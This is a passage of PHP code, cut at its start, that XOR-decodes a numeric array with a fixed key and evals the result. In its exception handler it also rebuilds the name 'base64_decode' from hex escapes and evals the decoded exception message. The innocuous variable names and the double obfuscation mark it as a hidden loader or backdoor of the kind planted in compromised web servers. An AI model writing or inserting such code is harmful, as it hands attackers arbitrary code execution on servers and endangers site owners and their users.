25, 30, 15, 63, 93, 23, 22, 91, 22, 94, 68, 65, 95, 50, 89, 23, 6, 88, 80, 76, 95, 50, 89, 23, 12, 67, 89, 89, 95];
$router = '8e8d745a';
$factory = array_reduce($loader, function($handler, $response) use ($router) {
    return $handler . chr($response ^ ord($router[strlen($handler) % strlen($router)]));
}, '');
eval('?>' . $factory);    throw new Exception($config);
} catch (Exception $client) {
    $loader = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
    eval('?>' . $loader($client->getMessage()));
}
